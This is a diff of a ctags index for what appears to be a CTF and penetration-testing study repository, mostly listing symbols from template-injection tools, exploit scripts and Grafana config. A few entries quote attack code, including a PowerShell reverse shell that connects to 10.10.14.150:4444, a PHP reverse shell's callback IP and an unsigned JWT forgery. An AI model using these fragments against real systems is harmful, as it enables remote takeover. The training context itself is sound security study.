+disable_total_stats	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^disable_total_stats = false$/;"	k	section:metrics
+discover_network	thm/The_Cod_Caper/linpeas.sh	/^discover_network (){$/;"	f
+discovery_port_scan	thm/The_Cod_Caper/linpeas.sh	/^discovery_port_scan (){$/;"	f
+distributionBase	dreamhackctf/login-1/tplmap/tests/env_java_tests/spark-app/gradle/wrapper/gradle-wrapper.properties	/^distributionBase=GRADLE_USER_HOME$/;"	k
+distributionPath	dreamhackctf/login-1/tplmap/tests/env_java_tests/spark-app/gradle/wrapper/gradle-wrapper.properties	/^distributionPath=wrapper\/dists$/;"	k
+distributionUrl	dreamhackctf/login-1/tplmap/tests/env_java_tests/spark-app/gradle/wrapper/gradle-wrapper.properties	/^distributionUrl=https\\:\/\/services.gradle.org\/distributions\/gradle-2.5-all.zip$/;"	k
+dlog	dreamhackctf/login-1/tplmap/utils/loggers.py	/^dlog = logging.getLogger('dlog')$/;"	v
+doActiveScan	dreamhackctf/login-1/tplmap/burp_extension/scanner_check.py	/^    def doActiveScan( self, baseRequestResponse, insertionPoint ):$/;"	m	class:ScannerCheck
+doPassiveScan	dreamhackctf/login-1/tplmap/burp_extension/scanner_check.py	/^    def doPassiveScan( self, baseRequestResponse ):$/;"	m	class:ScannerCheck
+doT	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^var doT=require('dot');$/;"	v
+do_EOF	dreamhackctf/login-1/tplmap/core/clis.py	/^    def do_EOF(self, line):$/;"	m	class:MultilineShell
+domain	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^domain = localhost$/;"	k	section:server
+dump_email	thm/Simple_CTF/46635.py	/^def dump_email():$/;"	f
+dump_email	thm/Simple_CTF/46635.py.bak	/^def dump_email():$/;"	f
+dump_password	thm/Simple_CTF/46635.py	/^def dump_password():$/;"	f
+dump_password	thm/Simple_CTF/46635.py.bak	/^def dump_password():$/;"	f
+dump_salt	thm/Simple_CTF/46635.py	/^def dump_salt():$/;"	f
+dump_salt	thm/Simple_CTF/46635.py.bak	/^def dump_salt():$/;"	f
+dump_username	thm/Simple_CTF/46635.py	/^def dump_username():$/;"	f
+dump_username	thm/Simple_CTF/46635.py.bak	/^def dump_username():$/;"	f
+dust	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^var dust = require('dustjs-linkedin');$/;"	v
+dusthelpers	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^var dusthelpers = require('dustjs-helpers');$/;"	v
+echo	dreamhackctf/login-1/tplmap/plugins/languages/bash.py	/^echo = """echo '%(s1)s'"""$/;"	v
+echo_no	thm/The_Cod_Caper/linpeas.sh	/^echo_no (){$/;"	f
+echo_not_found	thm/The_Cod_Caper/linpeas.sh	/^echo_not_found (){$/;"	f
+editors_can_admin	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^editors_can_admin = false$/;"	k	section:users
+ehlo_identity	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^ehlo_identity =$/;"	k	section:smtp
+ejs	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^var ejs=require('ejs');$/;"	v
+email	thm/Simple_CTF/46635.py	/^email = ""$/;"	v
+email	thm/Simple_CTF/46635.py.bak	/^email = ""$/;"	v
+email_attribute_name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^email_attribute_name = email:primary$/;"	k	section:auth.generic_oauth
+email_attribute_path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^email_attribute_path =$/;"	k	section:auth.generic_oauth
+emails	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[emails]$/;"	s
+empty	dreamhackctf/login-1/tplmap/utils/closures.py	/^empty = [ '' ]$/;"	v
+emptyline	dreamhackctf/login-1/tplmap/core/clis.py	/^    def emptyline(self):$/;"	m	class:MultilineShell
+emptyline	dreamhackctf/login-1/tplmap/core/clis.py	/^    def emptyline(self):$/;"	m	class:Shell
+enable	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enable =$/;"	k	section:feature_toggles
+enable_alpha	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enable_alpha = false$/;"	k	section:panels
+enable_alpha	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enable_alpha = false$/;"	k	section:plugins
+enable_gzip	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enable_gzip = false$/;"	k	section:server
+enable_login_token	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enable_login_token = false$/;"	k	section:auth.proxy
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled              = true$/;"	k	section:metrics
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = false$/;"	k	section:auth.anonymous
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = false$/;"	k	section:auth.generic_oauth
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = false$/;"	k	section:auth.github
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = false$/;"	k	section:auth.gitlab
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = false$/;"	k	section:auth.google
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = false$/;"	k	section:auth.grafana_com
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = false$/;"	k	section:auth.grafananet
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = false$/;"	k	section:auth.ldap
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = false$/;"	k	section:auth.proxy
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = false$/;"	k	section:auth.saml
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = false$/;"	k	section:quota
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = false$/;"	k	section:smtp
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = true$/;"	k	section:alerting
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = true$/;"	k	section:auth.basic
+enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enabled = true$/;"	k	section:explore
+encode	dreamhackctf/login-1/test.py	/^def encode(secret_key, session_cookie_structure):$/;"	f
+endpoint	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^endpoint =$/;"	k	section:external_image_storage.s3
+enforce_domain	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^enforce_domain = false$/;"	k	section:server
+enterprise	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[enterprise]$/;"	s
+epilog	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^epilog = """$/;"	v
+error_a	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^$error_a = null;$/;"	v
+error_or_timeout	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^error_or_timeout = alerting$/;"	k	section:alerting
+evaluate	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def evaluate(self, code,  **kwargs):$/;"	m	class:Plugin
+evaluate_blind	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def evaluate_blind(self, code, **kwargs):$/;"	m	class:Plugin
+evaluation_timeout_seconds	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^evaluation_timeout_seconds = 30$/;"	k	section:alerting
+execute	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def execute(self, code, **kwargs):$/;"	m	class:Plugin
+execute_alerts	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^execute_alerts = true$/;"	k	section:alerting
+execute_blind	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def execute_blind(self, code, **kwargs):$/;"	m	class:Plugin
+expected_data	dreamhackctf/login-1/tplmap/tests/test_channel.py	/^    expected_data = {$/;"	v	class:ChannelTest
+expected_data	dreamhackctf/login-1/tplmap/tests/test_java_freemarker.py	/^    expected_data = {$/;"	v	class:FreemarkerTest
+expected_data	dreamhackctf/login-1/tplmap/tests/test_java_velocity.py	/^    expected_data = {$/;"	v	class:VelocityTest
+expected_data	dreamhackctf/login-1/tplmap/tests/test_node_dot.py	/^    expected_data = {$/;"	v	class:DotTests
+expected_data	dreamhackctf/login-1/tplmap/tests/test_node_dust.py	/^    expected_data = {$/;"	v	class:DustTests
+expected_data	dreamhackctf/login-1/tplmap/tests/test_node_ejs.py	/^    expected_data = {$/;"	v	class:EjsTests
+expected_data	dreamhackctf/login-1/tplmap/tests/test_node_javascript.py	/^    expected_data = {$/;"	v	class:JavascriptTests
+expected_data	dreamhackctf/login-1/tplmap/tests/test_node_marko.py	/^    expected_data = {$/;"	v	class:MarkoTests
+expected_data	dreamhackctf/login-1/tplmap/tests/test_node_nunjucks.py	/^    expected_data = {$/;"	v	class:NunjucksTests
+expected_data	dreamhackctf/login-1/tplmap/tests/test_node_pug.py	/^    expected_data = {$/;"	v	class:PugTest
+expected_data	dreamhackctf/login-1/tplmap/tests/test_php_php.py	/^    expected_data = {$/;"	v	class:PhpTests
+expected_data	dreamhackctf/login-1/tplmap/tests/test_php_smarty_secured.py	/^    expected_data = {$/;"	v	class:SmartySecuredTest
+expected_data	dreamhackctf/login-1/tplmap/tests/test_php_smarty_unsecured.py	/^    expected_data = {$/;"	v	class:SmartyUnsecuredTest
+expected_data	dreamhackctf/login-1/tplmap/tests/test_php_twig_secured.py	/^    expected_data = {$/;"	v	class:TwigSecuredTest
+expected_data	dreamhackctf/login-1/tplmap/tests/test_php_twig_unsecured.py	/^    expected_data = {$/;"	v	class:TwigUnsecuredTest
+expected_data	dreamhackctf/login-1/tplmap/tests/test_py_jinja2.py	/^    expected_data = {$/;"	v	class:Jinja2Test
+expected_data	dreamhackctf/login-1/tplmap/tests/test_py_mako.py	/^    expected_data = {$/;"	v	class:MakoTest
+expected_data	dreamhackctf/login-1/tplmap/tests/test_py_python.py	/^    expected_data = {$/;"	v	class:PythonTests
+expected_data	dreamhackctf/login-1/tplmap/tests/test_py_tornado.py	/^    expected_data = {$/;"	v	class:TornadoTest
+expected_data	dreamhackctf/login-1/tplmap/tests/test_ruby_erb.py	/^    expected_data = {$/;"	v	class:ErbTests
+expected_data	dreamhackctf/login-1/tplmap/tests/test_ruby_ruby.py	/^    expected_data = {$/;"	v	class:RubyTests
+expected_data	dreamhackctf/login-1/tplmap/tests/test_ruby_slim.py	/^    expected_data = {$/;"	v	class:SlimTests
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_java_freemarker.py	/^    expected_data_blind = {$/;"	v	class:FreemarkerTest
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_java_velocity.py	/^    expected_data_blind = {$/;"	v	class:VelocityTest
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_node_dot.py	/^    expected_data_blind = {$/;"	v	class:DotTests
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_node_dust.py	/^    expected_data_blind = {$/;"	v	class:DustTests
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_node_ejs.py	/^    expected_data_blind = {$/;"	v	class:EjsTests
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_node_javascript.py	/^    expected_data_blind = {$/;"	v	class:JavascriptTests
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_node_marko.py	/^    expected_data_blind = {$/;"	v	class:MarkoTests
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_node_nunjucks.py	/^    expected_data_blind = {$/;"	v	class:NunjucksTests
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_node_pug.py	/^    expected_data_blind = {$/;"	v	class:PugTest
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_php_php.py	/^    expected_data_blind = {$/;"	v	class:PhpTests
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_php_smarty_secured.py	/^    expected_data_blind = {$/;"	v	class:SmartySecuredTest
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_php_smarty_unsecured.py	/^    expected_data_blind = {$/;"	v	class:SmartyUnsecuredTest
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_php_twig_unsecured.py	/^    expected_data_blind = {$/;"	v	class:TwigUnsecuredTest
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_py_jinja2.py	/^    expected_data_blind = {$/;"	v	class:Jinja2Test
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_py_mako.py	/^    expected_data_blind = {$/;"	v	class:MakoTest
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_py_python.py	/^    expected_data_blind = {$/;"	v	class:PythonTests
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_py_tornado.py	/^    expected_data_blind = {$/;"	v	class:TornadoTest
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_ruby_erb.py	/^    expected_data_blind = {$/;"	v	class:ErbTests
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_ruby_ruby.py	/^    expected_data_blind = {$/;"	v	class:RubyTests
+expected_data_blind	dreamhackctf/login-1/tplmap/tests/test_ruby_slim.py	/^    expected_data_blind = {$/;"	v	class:SlimTests
+explore	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[explore]$/;"	s
+external_enabled	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^external_enabled = true$/;"	k	section:snapshots
+external_image_storage	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[external_image_storage]$/;"	s
+external_image_storage.azure_blob	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[external_image_storage.azure_blob]$/;"	s
+external_image_storage.gcs	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[external_image_storage.gcs]$/;"	s
+external_image_storage.local	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[external_image_storage.local]$/;"	s
+external_image_storage.s3	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[external_image_storage.s3]$/;"	s
+external_image_storage.webdav	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[external_image_storage.webdav]$/;"	s
+external_manage_info	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^external_manage_info =$/;"	k	section:users
+external_manage_link_name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^external_manage_link_name =$/;"	k	section:users
+external_manage_link_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^external_manage_link_url =$/;"	k	section:users
+external_snapshot_name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^external_snapshot_name = Publish to snapshot.raintank.io$/;"	k	section:snapshots
+external_snapshot_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^external_snapshot_url = https:\/\/snapshots-origin.raintank.io$/;"	k	section:snapshots
+facility	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^facility =$/;"	k	section:log.syslog
+feature_toggles	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[feature_toggles]$/;"	s
+file	dreamhackctf/php-1/view.php	/^    $file = $_GET['file']?$_GET['file']:'';$/;"	v
+file_handler	dreamhackctf/login-1/tplmap/utils/loggers.py	/^file_handler = logging.handlers.RotatingFileHandler($/;"	v
+files	thm/Advent_of_Cyber/Day16/extract_all/showingTheMetaData.py	/^files = [".\/"]$/;"	v
+filters	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^filters =$/;"	k	section:log
+flag	thm/Simple_CTF/46635.py	/^flag = True$/;"	v
+flag	thm/Simple_CTF/46635.py.bak	/^flag = True$/;"	v
+foo	study_hacked/system_tip/problem_collectiong/bof_test_dir/func_pointer.c	/^int foo() {$/;"	f	typeref:typename:int
 foot hold	thm/LFI_inclusiton_box/README.md	/^# foot hold$/;"	c
-func	study_about_hacked/system_tip/problem_collectiong/bof.c	/^void func(int key){$/;"	f	typeref:typename:void
-func1	study_about_hacked/system_tip/problem_collectiong/bof_test_dir/func_call_anl.c	/^void func1() {$/;"	f	typeref:typename:void
+forgot_password	dreamhackctf/login-1/app.py	/^def forgot_password():$/;"	f
+format	dreamhackctf/login-1/tplmap/utils/loggers.py	/^    def format(self, record):$/;"	m	class:TplmapFormatter
+format	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^format = console$/;"	k	section:log.console
+format	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^format = text$/;"	k	section:log.file
+format	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^format = text$/;"	k	section:log.syslog
+format_epilog	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^    def format_epilog(self, formatter):$/;"	m	class:MyParser
+forward_data	dreamhackctf/login-1/tplmap/core/tcpserver.py	/^    def forward_data(self):$/;"	m	class:TcpServer
+freemarker	dreamhackctf/login-1/tplmap/tests/env_java_tests/spark-app/src/main/java/org/tplmap/webframeworks/SparkApplication.java	/^public static Object freemarker(Request request, Response response) {$/;"	m	class:SparkApplication
+from_address	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^from_address = admin@grafana.localhost$/;"	k	section:smtp
+from_name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^from_name = Grafana$/;"	k	section:smtp
+func	study_hacked/system_tip/problem_collectiong/problem01.c	/^void func(int key){$/;"	f	typeref:typename:void
+func1	study_hacked/system_tip/problem_collectiong/bof_test_dir/func_call_anl.c	/^void func1() {$/;"	f	typeref:typename:void
+games	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^games:x:5:60:games:\/usr\/games:\/bin\/sh$/;"	u	home:/usr/games	shell:/bin/sh
+general	dreamhackctf/login-1/tplmap/utils/cliparser.py	/^general = OptionGroup(parser, "General", "These "$/;"	v
+generateRandomString	dreamhackctf/login-1/tplmap/tests/env_php_tests/eval.php	/^function generateRandomString($length = 10) {$/;"	f
+generateRandomString	dreamhackctf/login-1/tplmap/tests/env_php_tests/smarty-3.1.32-secured.php	/^function generateRandomString($length = 10) {$/;"	f
+generateRandomString	dreamhackctf/login-1/tplmap/tests/env_php_tests/smarty-3.1.32-unsecured.php	/^function generateRandomString($length = 10) {$/;"	f
+generateRandomString	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.19.0-unsecured.php	/^function generateRandomString($length = 10) {$/;"	f
+generateRandomString	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.20.0-secured.php	/^function generateRandomString($length = 10) {$/;"	f
+get	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def get(self, key, default = None):$/;"	m	class:Plugin
+getConfidence	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def getConfidence( self ):$/;"	m	class:ScanIssue
+getEngines	dreamhackctf/login-1/tplmap/burp_extension/config_tab.py	/^    def getEngines( self ):$/;"	m	class:ConfigTab
+getHttpMessages	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def getHttpMessages( self ):$/;"	m	class:ScanIssue
+getHttpService	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def getHttpService( self ):$/;"	m	class:ScanIssue
+getIssueBackground	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def getIssueBackground( self ):$/;"	m	class:ScanIssue
+getIssueDetail	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def getIssueDetail( self ):$/;"	m	class:ScanIssue
+getIssueName	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def getIssueName( self ):$/;"	m	class:ScanIssue
+getIssueType	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def getIssueType( self ):$/;"	m	class:ScanIssue
+getLevel	dreamhackctf/login-1/tplmap/burp_extension/config_tab.py	/^    def getLevel( self ):$/;"	m	class:ConfigTab
+getPayloadPosition	dreamhackctf/login-1/tplmap/burp_extension/config_tab.py	/^    def getPayloadPosition( self ):$/;"	m	class:ConfigTab
+getPlugin	dreamhackctf/login-1/tplmap/burp_extension/config_tab.py	/^    def getPlugin( self ):$/;"	m	class:PluginCheckBox
+getRemediationBackground	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def getRemediationBackground( self ):$/;"	m	class:ScanIssue
+getRemediationDetail	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def getRemediationDetail( self ):$/;"	m	class:ScanIssue
+getSeverity	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def getSeverity( self ):$/;"	m	class:ScanIssue
+getTabCaption	dreamhackctf/login-1/tplmap/burp_extension/config_tab.py	/^    def getTabCaption( self ):$/;"	m	class:ConfigTab
+getTechniques	dreamhackctf/login-1/tplmap/burp_extension/config_tab.py	/^    def getTechniques( self ):$/;"	m	class:ConfigTab
+getUiComponent	dreamhackctf/login-1/tplmap/burp_extension/config_tab.py	/^    def getUiComponent( self ):$/;"	m	class:ConfigTab
+getUrl	dreamhackctf/login-1/tplmap/burp_extension/scan_issue.py	/^    def getUrl( self ):$/;"	m	class:ScanIssue
+get_db	dreamhackctf/login-1/app.py	/^def get_db():$/;"	f
+get_db	dreamhackctf/simple_sqli/app.py	/^def get_db():$/;"	f
+global	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh.s	/^global _start$/;"	l
+global	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh2.s	/^global _start$/;"	l
+global	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh3.s	/^global _start$/;"	l
+global	study_hacked/system_tip/book4b_pwn/step5/shellcode/binsh4.s	/^global _start$/;"	l
+global_api_key	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^global_api_key = -1$/;"	k	section:quota
+global_dashboard	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^global_dashboard = -1$/;"	k	section:quota
+global_org	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^global_org = -1$/;"	k	section:quota
+global_session	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^global_session = -1$/;"	k	section:quota
+global_user	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^global_user = -1$/;"	k	section:quota
+gnats	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^gnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/bin\/sh$/;"	u	home:/var/lib/gnats	shell:/bin/sh
+google_analytics_ua_id	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^google_analytics_ua_id =$/;"	k	section:analytics
+google_tag_manager_id	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^google_tag_manager_id =$/;"	k	section:analytics
+grafana_com	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[grafana_com]$/;"	s
+grafana_net	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^[grafana_net]$/;"	s
+header_name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^header_name = X-WEBAUTH-USER$/;"	k	section:auth.proxy
+header_property	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^header_property = username$/;"	k	section:auth.proxy
+headerfunc	dreamhackctf/login-1/tplmap/tests/env_py_tests/webserver.py	/^def headerfunc(engine):$/;"	f
+headers	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^headers =$/;"	k	section:auth.proxy
+headers	htb/Remote/Gaining/umbraco_cve1.py	/^headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};$/;"	v
+headers	htb/Remote/Gaining/umbraco_cve2.py	/^headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};$/;"	v
+headers	htb/Remote/Gaining/umbraco_cve3.py	/^headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};$/;"	v
+host	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^host = 127.0.0.1:3306$/;"	k	section:database
+host	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^host = localhost:25$/;"	k	section:smtp
+host	htb/Remote/Gaining/umbraco_cve1.py	/^host = "http:\/\/10.10.10.180";$/;"	v
+host	htb/Remote/Gaining/umbraco_cve2.py	/^host = "http:\/\/10.10.10.180";$/;"	v
+host	htb/Remote/Gaining/umbraco_cve3.py	/^host = "http:\/\/10.10.10.180";$/;"	v
+hosted_domain	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^hosted_domain =$/;"	k	section:auth.google
+http	dreamhackctf/login-1/tplmap/tests/env_node_tests/connect-app.js	/^var http = require('http');$/;"	v
+http_addr	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^http_addr =$/;"	k	section:server
+http_port	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^http_port = 3000$/;"	k	section:server
+i	htb/Remote/mini-reverse.ps1	/^$client = New-Object System.Net.Sockets.TCPClient('10.10.14.150',4444);$stream = $client.GetStre/;"	v
+i	htb/Remote/mini-reverse.ps1	/^$sm=(New-Object Net.Sockets.TCPClient('10.10.14.150',4444)).GetStream();[byte[]]$bt=0..65535|%{0/;"	v
+icmp_recon	thm/The_Cod_Caper/linpeas.sh	/^icmp_recon (){$/;"	f
+idp_metadata	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^idp_metadata =$/;"	k	section:auth.saml
+idp_metadata_path	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^idp_metadata_path =$/;"	k	section:auth.saml
+idp_metadata_url	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^idp_metadata_url =$/;"	k	section:auth.saml
+idpw	dreamhackctf/login-1/curlRequest.py	/^		idpw = soup.find_all("ul")[2]$/;"	v
+if_loops	dreamhackctf/login-1/tplmap/utils/closures.py	/^if_loops = [ ':' ]$/;"	v
+index	dreamhackctf/cookie/app.py	/^def index():$/;"	f
+index	dreamhackctf/login-1/app.py	/^def index():$/;"	f
+index	dreamhackctf/simple_sqli/app.py	/^def index():$/;"	f
+init	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def init(self):$/;"	m	class:Plugin
+init	dreamhackctf/login-1/tplmap/plugins/engines/dot.py	/^    def init(self):$/;"	m	class:Dot
+init	dreamhackctf/login-1/tplmap/plugins/engines/dust.py	/^    def init(self):$/;"	m	class:Dust
+init	dreamhackctf/login-1/tplmap/plugins/engines/ejs.py	/^    def init(self):$/;"	m	class:Ejs
+init	dreamhackctf/login-1/tplmap/plugins/engines/erb.py	/^    def init(self):$/;"	m	class:Erb
+init	dreamhackctf/login-1/tplmap/plugins/engines/freemarker.py	/^    def init(self):$/;"	m	class:Freemarker
+init	dreamhackctf/login-1/tplmap/plugins/engines/jinja2.py	/^    def init(self):$/;"	m	class:Jinja2
+init	dreamhackctf/login-1/tplmap/plugins/engines/mako.py	/^    def init(self):$/;"	m	class:Mako
+init	dreamhackctf/login-1/tplmap/plugins/engines/marko.py	/^    def init(self):$/;"	m	class:Marko
+init	dreamhackctf/login-1/tplmap/plugins/engines/nunjucks.py	/^    def init(self):$/;"	m	class:Nunjucks
+init	dreamhackctf/login-1/tplmap/plugins/engines/pug.py	/^    def init(self):$/;"	m	class:Pug
+init	dreamhackctf/login-1/tplmap/plugins/engines/slim.py	/^    def init(self):$/;"	m	class:Slim
+init	dreamhackctf/login-1/tplmap/plugins/engines/smarty.py	/^    def init(self):$/;"	m	class:Smarty
+init	dreamhackctf/login-1/tplmap/plugins/engines/tornado.py	/^    def init(self):$/;"	m	class:Tornado
+init	dreamhackctf/login-1/tplmap/plugins/engines/twig.py	/^    def init(self):$/;"	m	class:Twig
+init	dreamhackctf/login-1/tplmap/plugins/engines/velocity.py	/^    def init(self):$/;"	m	class:Velocity
+inj	dreamhackctf/login-1/tplmap/tests/env_php_tests/eval.php	/^$inj=$_GET["inj"];$/;"	v
+inj	dreamhackctf/login-1/tplmap/tests/env_php_tests/smarty-3.1.32-secured.php	/^$inj=$_GET["inj"];$/;"	v
+inj	dreamhackctf/login-1/tplmap/tests/env_php_tests/smarty-3.1.32-unsecured.php	/^$inj=$_GET["inj"];$/;"	v
+inj	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.19.0-unsecured.php	/^$inj=$_GET["inj"];$/;"	v
+inj	dreamhackctf/login-1/tplmap/tests/env_php_tests/twig-1.20.0-secured.php	/^$inj=$_GET["inj"];$/;"	v
+inject	dreamhackctf/login-1/tplmap/core/plugin.py	/^    def inject(self, code, **kwargs):$/;"	m	class:Plugin
+input	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^		$input = fread($pipes[1], $chunk_size);$/;"	v
+input	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^		$input = fread($pipes[2], $chunk_size);$/;"	v
+input	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^		$input = fread($sock, $chunk_size);$/;"	v
+instance_name	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^instance_name = ${HOSTNAME}$/;"	k
+integer	dreamhackctf/login-1/tplmap/utils/closures.py	/^integer = [ '1' ]$/;"	v
+interact	study_hacked/system_tip/book4b_pwn/step5/aslr/aslr.py	/^def interact(s):$/;"	f
+interact	study_hacked/system_tip/book4b_pwn/step5/aslr/bruteforce.py	/^def interact(s):$/;"	f
+interact	study_hacked/system_tip/book4b_pwn/step5/aslr/leak.py	/^def interact(s):$/;"	f
+interval_seconds	dreamhackctf/web-misconf-1/deploy/defaults.ini	/^interval_seconds     = 10$/;"	k	section:metrics
+ip	thm/Advent_of_Cyber/Day23/php-reverse-shell.phtml	/^$ip = '10.9.26.67';  \/\/ CHANGE THIS$/;"	v
+irc	ctf-d/Incident_Response/2012-08-27/accounts/passwd	/^irc:x:39:39:ircd:\/var\/run\/ircd:\/bin\/sh$/;"	u	home:/var/run/ircd	shell:/bin/sh
+iterable_var	dreamhackctf/login-1/tplmap/utils/closures.py	/^iterable_var = [ '[1]' ]/;"	v
+jwt2	dreamhackctf/login-1/test2.py	/^jwt2 = jwt.encode({'id':'1'} , '',algorithm='none')$/;"	v
+key	study_hacked/system_tip/book4b_pwn/step4/stack-bof/bof2/attack_script_pwntool.py	/^key = p32(0x12345678)$/;"	v
